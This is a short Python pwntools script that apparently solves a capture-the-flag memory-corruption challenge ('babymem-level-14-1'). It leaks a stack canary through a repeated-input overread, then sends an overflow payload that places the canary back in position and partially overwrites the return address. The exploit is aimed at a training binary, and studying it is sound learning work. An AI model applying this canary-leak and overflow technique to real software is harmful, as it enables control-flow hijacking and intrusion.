
from pwn import *
p = process("/challenge/babymem-level-14-1")
print(p.recvuntil(b"size:"))
p.sendline(b'120')
print(p.recvuntil(b"bytes)!"))
win = b"REPEAT"
p.send(win)
print(p.recvuntil(b"size:"))
p.sendline(b'57')
win = b"REPEAT"
win += b'\n'*51
p.send(win)
print(p.recvuntil(b"said"))
for j in range(51):
    print(j, p.recvline())
canary = p.recvline()
print("Canary : ",canary)
out = p.recvuntil(b"size:")
print(out.decode('utf-8', errors='ignore'))
p.send(b'400')
win = b"A"*329
win += b'\x00'+canary
win += b"A"*7
win += b'\xd5\x1d'
p.send(win)
for j in range(200):
    print(p.recvline())






# 0x00007fffffffd1d0
# 0x7fffffffd328

REPEATAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA